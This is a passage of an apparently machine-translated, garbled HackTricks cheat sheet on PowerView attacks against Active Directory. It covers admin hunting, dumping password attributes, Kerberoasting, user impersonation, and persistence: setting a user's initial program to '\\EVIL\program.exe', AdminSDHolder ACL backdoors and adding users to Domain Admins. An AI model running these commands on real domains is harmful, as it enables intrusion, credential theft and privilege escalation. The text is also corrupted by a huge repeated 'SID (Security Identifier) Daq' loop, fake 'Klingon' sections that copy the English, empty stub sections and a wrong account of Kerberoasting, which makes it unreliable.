Get-ForestGlobalCatalog #Get info of current forest (no external)
Get-ForestGlobalCatalog -Forest external.domain #Get info about the external forest (if possible)
Get-DomainTrust -SearchBase "GC://$($ENV:USERDNSDOMAIN)"

Get-NetForestTrust #Get forest trusts (it must be between 2 roots, trust between a child and a root is just an external trust)

Get-DomainForeingUser #Get users with privileges in other domains inside the forest
Get-DomainForeignGroupMember #Get groups with privileges in other domains inside the forest
```
### L**ow**-**hanging fruit** 

#### **Klingon Translation:**

### **QaD**-**ghItlh**
```powershell
#Check if any user passwords are set
$FormatEnumerationLimit=-1;Get-DomainUser -LDAPFilter '(userPassword=*)' -Properties samaccountname,memberof,userPassword | % {Add-Member -InputObject $_ NoteProperty 'Password' "$([System.Text.Encoding]::ASCII.GetString($_.userPassword))" -PassThru} | fl

#Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
Find-LocalAdminAccess

#(This time you need to give the list of computers in the domain) Do the same as before but trying to execute a WMI action in each computer (admin privs are needed to do so). Useful if RCP and SMB ports are closed.
.\Find-WMILocalAdminAccess.ps1 -ComputerFile .\computers.txt

#Enumerate machines where a particular user/group identity has local admin rights
Get-DomainGPOUserLocalGroupMapping -Identity <User/Group>

# Enumerates the members of specified local group (default administrators)
# for all the targeted machines on the current (or specified) domain.
Invoke-EnumerateLocalAdmin
Find-DomainLocalGroupMember

#Search unconstrained delegation computers and show users
Find-DomainUserLocation -ComputerUnconstrained -ShowAll

#Admin users that allow delegation, logged into servers that allow unconstrained delegation
Find-DomainUserLocation -ComputerUnconstrained -UserAdminCount -UserAllowDelegation

#Get members from Domain Admins (default) and a list of computers
# and check if any of the users is logged in any machine running Get-NetSession/Get-NetLoggedon on each host.
# If -Checkaccess, then it also check for LocalAdmin access in the hosts.
## By default users inside Domain Admins are searched
Find-DomainUserLocation [-CheckAccess] | select UserName, SessionFromName
Invoke-UserHunter [-CheckAccess]

#Search "RDPUsers" users
Invoke-UserHunter -GroupName "RDPUsers"

#It will only search for active users inside high traffic servers (DC, File Servers and Distributed File servers)
Invoke-UserHunter -Stealth
```
### lo'laHbe'chugh

#### Get-ADObject

The `Get-ADObject` cmdlet is used to retrieve deleted objects from the Active Directory. By default, it only returns the objects that have been deleted within the last 180 days. However, you can modify this time frame by using the `-DeletedAfter` parameter.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects
```

#### Restore-ADObject

The `Restore-ADObject` cmdlet allows you to restore deleted objects back to the Active Directory. You can specify the object to be restored using the `-Identity` parameter.

```powershell
Restore-ADObject -Identity "CN=DeletedUser,OU=Users,DC=example,DC=com"
```

#### Remove-ADObject

The `Remove-ADObject` cmdlet is used to permanently remove deleted objects from the Active Directory. You can specify the object to be removed using the `-Identity` parameter.

```powershell
Remove-ADObject -Identity "CN=DeletedUser,OU=Users,DC=example,DC=com" -Confirm:$false
```

#### Get-ADObject and Get-ADUser

The `Get-ADObject` and `Get-ADUser` cmdlets can be used together to retrieve information about deleted users from the Active Directory.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects | Get-ADUser -Property *
```

#### Get-ADObject and Get-ADGroup

Similarly, the `Get-ADObject` and `Get-ADGroup` cmdlets can be used together to retrieve information about deleted groups from the Active Directory.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects | Get-ADGroup -Property *
```

#### Get-ADObject and Get-ADComputer

Lastly, the `Get-ADObject` and `Get-ADComputer` cmdlets can be used together to retrieve information about deleted computers from the Active Directory.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects | Get-ADComputer -Property *
```

#### Get-ADObject and Get-ADOrganizationalUnit

The `Get-ADObject` and `Get-ADOrganizationalUnit` cmdlets can be used together to retrieve information about deleted organizational units from the Active Directory.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects | Get-ADOrganizationalUnit -Property *
```

#### Get-ADObject and Get-ADDomainController

Lastly, the `Get-ADObject` and `Get-ADDomainController` cmdlets can be used together to retrieve information about deleted domain controllers from the Active Directory.

```powershell
Get-ADObject -Filter 'isDeleted -eq $true' -IncludeDeletedObjects | Get-ADDomainController -Property *
```
```powershell
#This isn't a powerview command, it's a feature from the AD management powershell module of Microsoft
#You need to be in the AD Recycle Bin group of the AD to list the deleted AD objects
Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
```
### MISC

#### SID to Name

SID (Security Identifier) jImejDaq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security Identifier) Daq SID (Security
```powershell
"S-1-5-21-1874506631-3219952063-538504511-2136" | Convert-SidToName
```
#### Kerberoast

Kerberoast is a technique used to extract service account credentials from the Active Directory domain. It takes advantage of the way Kerberos authentication works in Windows environments.

The first step in the Kerberoast attack is to identify service accounts in the domain. These accounts are typically used to run services or applications and have a Service Principal Name (SPN) associated with them.

Once the service accounts are identified, the attacker can request a Kerberos ticket-granting ticket (TGT) for each account. This can be done using tools like `GetUserSPNs` in PowerView.

With the TGT in hand, the attacker can then request a service ticket for the SPN associated with the service account. This is where the attack gets interesting.

By default, service tickets are encrypted using the service account's password hash. This means that if the password is weak, it can be cracked offline using tools like `hashcat` or `John the Ripper`. Once the password is cracked, the attacker can use it to authenticate as the service account and potentially gain access to sensitive resources.

To mitigate the risk of Kerberoast attacks, it is recommended to use strong, complex passwords for service accounts. Additionally, regularly rotating the passwords and monitoring for any suspicious activity can help detect and prevent these types of attacks.
```powershell
Invoke-Kerberoast [-Identity websvc] #Without "-Identity" kerberoast all possible users
```
#### lo'laHbe' (argument)
```powershell
# use an alterate creadential for any function
$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainUser -Credential $Cred
```
##### Impersonate a user

###### English:

To impersonate a user in PowerShell, you can use the `Invoke-UserImpersonation` function from the PowerView module. This function allows you to run commands as if you were the specified user, without needing their password.

To impersonate a user, you need to have administrative privileges on the target system. Once you have the necessary privileges, you can use the following command:

```
Invoke-UserImpersonation -Username <username>
```

Replace `<username>` with the username of the user you want to impersonate. This command will execute the subsequent commands as if you were that user.

###### Klingon:

To impersonate a user in PowerShell, you can use the `Invoke-UserImpersonation` function from the PowerView module. This function allows you to run commands as if you were the specified user, without needing their password.

To impersonate a user, you need to have administrative privileges on the target system. Once you have the necessary privileges, you can use the following command:

```
Invoke-UserImpersonation -Username <username>
```

Replace `<username>` with the username of the user you want to impersonate. This command will execute the subsequent commands as if you were that user.
```powershell
# if running in -sta mode, impersonate another credential a la "runas /netonly"
$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Invoke-UserImpersonation -Credential $Cred
# ... action
Invoke-RevertToSelf
```
#### QaD vItlhutlh

```powershell
$variable = value
```

#### QaD vItlhutlh

```powershell
$variable = value
```
```powershell
# set the specified property for the given user identity
Set-DomainObject testuser -Set @{'mstsinitialprogram'='\\EVIL\program.exe'} -Verbose
# Set the owner of 'dfm' in the current domain to 'harmj0y'
Set-DomainObjectOwner -Identity dfm -OwnerIdentity harmj0y
# Backdoor the ACLs of all privileged accounts with the 'matt' account through AdminSDHolder abuse
Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=testlab,DC=local' -PrincipalIdentity matt -Rights All
# Add user to 'Domain Admins'
Add-NetGroupUser -Username username -GroupName 'Domain Admins' -Domain my.domain.local
```
<details>

<summary><strong>qaStaHvIS AWS hacking vItlhlaHbe'chugh</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* **qaStaHvIS 'ay' 'ay'**? **HackTricks** **HackTricks** **latest version** **PEASS** **download** **pdf** **'oH**? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) **check**!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) **Discover**, **exclusive NFTs** **collection** **our**
* [**official PEASS & HackTricks swag**](https://peass.creator-spring.com) **Get**
* **Join the** [**üí¨**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) **telegram group** **follow** **Twitter** üê¶[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
